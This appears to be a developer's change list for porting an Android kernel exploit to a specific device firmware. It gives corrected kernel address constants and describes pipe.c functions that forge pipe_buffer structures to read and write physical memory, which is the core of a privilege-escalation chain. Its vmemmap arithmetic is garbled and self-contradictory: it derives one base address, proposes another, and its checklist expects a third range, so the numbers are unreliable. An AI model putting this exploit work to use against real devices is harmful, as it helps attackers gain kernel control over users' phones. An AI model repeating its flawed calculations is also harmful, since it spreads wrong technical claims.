# CURRENT CODE STATE — What Needs Changing, What Doesn't

This document records the **current values** and **required changes** for every
relevant file in the exploit codebase.

---

## 1. target.h (Device Configuration)

File: `src/targets/a37xv2-A376BXXU1AZB7/target.h`

### 1.1 Lines Requiring Modification

| Line | Current Value | Should Be | Reason |
|------|---------------|-----------|--------|
| L40 | `#define P0_PAGE_OFFSET 0xffffffc000000000ULL` | `#define P0_PAGE_OFFSET 0xffffff8000000000ULL` | Linear map base |
| L108 | `#define KERNELSNITCH_IDENTITY_START 0xffffffc000000000ULL` | `#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL` | Identity window start |
| L109 | `#define KERNELSNITCH_IDENTITY_END 0xffffffc200000000ULL` | `#define KERNELSNITCH_IDENTITY_END 0xffffff8300000000ULL` | Identity window end (12GB) |
| L110 | `#define DIRECT_MAP_BASE 0xffffffc000000000ULL` | `#define DIRECT_MAP_BASE 0xffffff8000000000ULL` | Direct map base |
| L111 | `#define DIRECT_MAP_END 0xffffffc200000000ULL` | `#define DIRECT_MAP_END 0xffffff8300000000ULL` | Direct map end (12GB) |
| L112 | `#define VMEMMAP_START 0xffffffe400000000ULL` | `#define VMEMMAP_START 0xfffffffc00000000ULL` | vmemmap base (needs device verification) |

### 1.2 Lines NOT Requiring Modification

| Line | Current Value | Reason |
|------|---------------|--------|
| L39 | `#define KIMAGE_TEXT_BASE 0xffffffc008000000ULL` | Kernel image base, confirmed correct |
| L41 | `#define P0_PHYS_OFFSET 0x80000000ULL` | Physical offset, confirmed correct |
| L42 | `#define P0_KERNEL_PHYS_LOAD 0x80000000ULL` | Physical load address, confirmed correct |
| L44 | `#define SKB_DATA_DELTA (-0xe80LL)` | SKB data offset, unaffected |
| L115-181 | All fops offsets | Based on KIMAGE_TEXT_BASE, unaffected |

### 1.3 VMEMMAP_START Derivation

If RAM = 12GB:
```
DIRECT_MAP_BASE = 0xffffff8000000000
DIRECT_MAP_END = 0xffffff8300000000  (0xffffff8000000000 + 12GB)
DIRECT_MAP_PAGES = (0xffffff8300000000 - 0xffffff8000000000) / 4096 = 3145728

VMEMMAP_START = (DIRECT_MAP_BASE >> 12) * 64 = 0xffffff8000000000 / 4096 * 64
             = 0xffffff8000000 >> 12 = 0xffffff80000 * 64 = ?

# More precise calculation:
pfn_base = 0xffffff8000000000 >> 12 = 0xffffff80000
page_struct_addr = pfn_base * 64 = 0xffffff80000 * 0x40 = 0xfffffffe00000000

# This gives VMEMMAP_START = 0xfffffffe00000000
# But current profile says VMEMMAP_START = 0xffffffe400000000
# This means RAM might not be 12GB, or there's another offset...
```

**Note**: Exact VMEMMAP_START value needs device verification.

---

## 2. common.h (General Definitions)

File: `src/common.h`

### 2.1 Related Lines (No Direct Modification Needed, Auto-Derived)

| Line | Definition | Reason |
|------|------------|--------|
| L126 | `#define DIRECT_MAP_PAGES ((DIRECT_MAP_END - DIRECT_MAP_BASE) >> PAGE_SHIFT)` | Auto-calculated |
| L127 | `#define VMEMMAP_END (VMEMMAP_START + DIRECT_MAP_PAGES * STRUCT_PAGE_SIZE)` | Auto-calculated |

### 2.2 Derived Values (Update Automatically After target.h Change)

If target.h changes to:
```
DIRECT_MAP_BASE = 0xffffff8000000000
DIRECT_MAP_END = 0xffffff8300000000
VMEMMAP_START = 0xfffffffc00000000  (pending verification)
```

Then:
```
DIRECT_MAP_PAGES = (0xffffff8300000000 - 0xffffff8000000000) / 4096 = 3145728
VMEMMAP_END = 0xfffffffc00000000 + 3145728 * 64 = 0xfffffffc00000000 + 0x10000000 = 0xfffffffd00000000
```

---

## 3. pipe.c (Pipe Operations)

File: `src/pipe.c`

### 3.1 direct_to_page (L357-360)

Current code:
```c
uintptr_t direct_to_page(uintptr_t addr) {
  uintptr_t pfn = (addr - DIRECT_MAP_BASE) >> PAGE_SHIFT;
  return VMEMMAP_START + pfn * STRUCT_PAGE_SIZE;
}
```

**Issue**: Uses wrong VMEMMAP_START

**After fix**:
```c
uintptr_t direct_to_page(uintptr_t addr) {
  uintptr_t pfn = (addr - DIRECT_MAP_BASE) >> PAGE_SHIFT;
  return VMEMMAP_START + pfn * STRUCT_PAGE_SIZE;
  // Note: Automatically corrects when VMEMMAP_START is fixed
}
```

### 3.2 page_to_direct (L372-375)

Current code:
```c
uintptr_t page_to_direct(uintptr_t page) {
  uintptr_t pfn = (page - VMEMMAP_START) / STRUCT_PAGE_SIZE;
  return DIRECT_MAP_BASE + (pfn << PAGE_SHIFT);
}
```

**Issue**: Uses wrong VMEMMAP_START and DIRECT_MAP_BASE

**After fix**:
```c
uintptr_t page_to_direct(uintptr_t page) {
  uintptr_t pfn = (page - VMEMMAP_START) / STRUCT_PAGE_SIZE;
  return DIRECT_MAP_BASE + (pfn << PAGE_SHIFT);
  // Note: Automatically corrects when both constants are fixed
}
```

### 3.3 find_pipe_buffer (L477-547)

Current code:
```c
if (pb.page >= VMEMMAP_START && pb.page < VMEMMAP_END) {
  // Accept this pipe_buffer
}
```

**Issue**: VMEMMAP_START and VMEMMAP_END are wrong

**After fix**:
```c
if (pb.page >= VMEMMAP_START && pb.page < VMEMMAP_END) {
  // Accept this pipe_buffer
  // Note: Automatically corrects when both constants are fixed
}
```

### 3.4 Parts NOT Requiring Modification

- `pipe_phys_read` (L549-596): Uses `direct_to_page`, benefits from fix
- `pipe_phys_write` (L598-645): Uses `direct_to_page`, benefits from fix
- `forge_pipe_buffers_on_page` (L648-662): Uses `direct_to_page`, benefits from fix
- All other pipe functions: Don't use VMEMMAP/DIRECT_MAP constants directly

---

## 4. Other Files

### 4.1 util.c
- `is_direct_ptr()`: Checks if address is in `[DIRECT_MAP_BASE, DIRECT_MAP_END)` range
- Needs modification: Yes, if this function uses these constants

### 4.2 slide_app.c
- Uses `DIRECT_MAP_BASE/END` for address validation
- Needs modification: Yes, automatically via target.h changes

### 4.3 kernelsnitch/
- Uses `KERNELSNITCH_IDENTITY_START/END`
- Needs modification: Yes, automatically via target.h changes

---

## 5. Modification Priority

### 5.1 Must Modify (In Order)
1. `target.h` L40: `P0_PAGE_OFFSET` → `0xffffff8000000000`
2. `target.h` L108-111: `IDENTITY_*` and `DIRECT_MAP_*` → `0xffffff80.../0xffffff83...`
3. `target.h` L112: `VMEMMAP_START` → correct value (pending device verification)

### 5.2 Auto-Update (No Direct Modification)
- `common.h` L126-127: `DIRECT_MAP_PAGES` and `VMEMMAP_END` recalculate automatically
- `pipe.c` L357-360, 372-375, 477-547: Functions using these constants work automatically

### 5.3 No Modification Needed
- All constants based on `KIMAGE_TEXT_BASE` (fops offsets, etc.)
- All stage 1-2 code (slide calculation in slide_app.c)
- All stage 4-7 code (depends on stage 2-3 success)

---

## 6. Verification Checklist

After modification, verify:
- [ ] `DIRECT_MAP_PAGES` calculation correct
- [ ] `VMEMMAP_END` calculation correct
- [ ] `direct_to_page` returns correct page struct address for known direct map address
- [ ] `page_to_direct` returns correct direct map address for known page struct address
- [ ] `find_pipe_buffer` accepts page pointers in `0xfffffffe00000000` range
- [ ] `is_direct_ptr` returns true for `0xffffff80...` addresses
- [ ] Compilation succeeds without warnings
- [ ] Device loading succeeds without errors

---

## 7. Risk Assessment

### 7.1 Low Risk
- Modifying target.h constants: Only affects address calculations, not logic
- Auto-derived constants: Mathematical computation, no errors possible

### 7.2 Medium Risk
- Exact VMEMMAP_START value: If wrong, find_pipe_buffer fails
- But won't cause kernel panic (just exploit failure)

### 7.3 Mitigation
- Verify VMEMMAP_START on device first
- Use read-only tests to validate constants
- Modify incrementally, verify each step

---

*Document created: 2026-08-27*
*Status: Complete code state documentation*
